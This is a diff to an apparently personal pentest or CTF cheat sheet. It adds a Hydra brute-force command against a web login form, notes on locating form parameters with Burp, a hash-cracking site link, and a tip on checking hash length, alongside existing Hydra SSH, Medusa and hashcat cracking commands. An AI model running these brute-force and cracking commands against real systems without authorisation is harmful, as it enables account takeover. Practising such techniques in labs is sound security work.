@@ -13,9 +13,17 @@ Hydra
 hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
 hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
 
+# crack web passwords
+http-post-form can change as user module changes
+Invalid: what message does the page give for wrong creds
+for parameters check with burp
+
+hydra -l admin -P /usr/share/seclists/Passwords/10k_most_common.txt <targetip> http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 
+
+-----------------------------------
 
 Medusa
-medusa -h <targetip> -u admin -P /usr/share/wordlısts/rockyou.txt -M http -m DIR:/test -T 10
+medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
 
 -----------------------------------
 
@@ -31,6 +39,13 @@ hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
 LM/NTLM
 hashcat -h | grep -i lm 
 hashcat -m 3000  hashes --rules --wordlist=/usr/share/wordlists/rockyou.txt
+
+https://hashkiller.co.uk/
+
+---------------------
+
+When you find some digits, check if it's 32 bit
+echo -n ....... | wc -c
 
 
 
